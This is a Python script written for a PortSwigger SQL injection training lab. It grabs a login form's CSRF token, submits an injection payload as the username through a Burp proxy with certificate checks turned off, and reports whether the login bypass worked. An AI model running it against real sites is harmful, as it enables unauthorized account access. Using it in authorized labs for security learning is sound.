#First SQLi lab from Portswigger, this script was made by Rana Khalil
#https://portswigger.net/web-security/learning-paths/sql-injection/sql-injection-subverting-application-logic/sql-injection/lab-login-bypass#

import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from bs4 import BeautifulSoup # we need this library because we are going to fetch an HTML element, in this case the csrf input
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'} #goes through burpsuite


def get_csrf_token(s,url):
    r = s.get(url, verify=False, proxies=proxies)# this gets the html
    #print(r.text)
    soup = BeautifulSoup(r.text, 'html.parser') #this scraps the html 
    csrf = soup.find("input")['value'] # finds the value that we need 
    return csrf


def exploit_sqli(s,url,payload):
    csrf = get_csrf_token(s,url)
    data = {"csrf": csrf,
            "username":payload,
            "password":"randompass"}
    
    r = s.post(url,data=data,verify=False, proxies=proxies)
    res = r.text #response of the request
    if "Log out" in res:
        return True
    else:
        return False

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        payload = sys.argv[2].strip()
    except IndexError:
         print ("[-] Usage: %s <url> <payload>" % sys.argv[0])
         print ('[-] Example: %s www.example.com "1=1"' % sys.argv[0])
         sys.exit(-1)
      
      
s = requests.Session() #starts a Session object 

if exploit_sqli(s,url,payload): # if the funcion returns true then it's vulnerable to SQLi
    print ("[+] SQLi successful")
else:
    print("[-] SQLi Unsuccessful")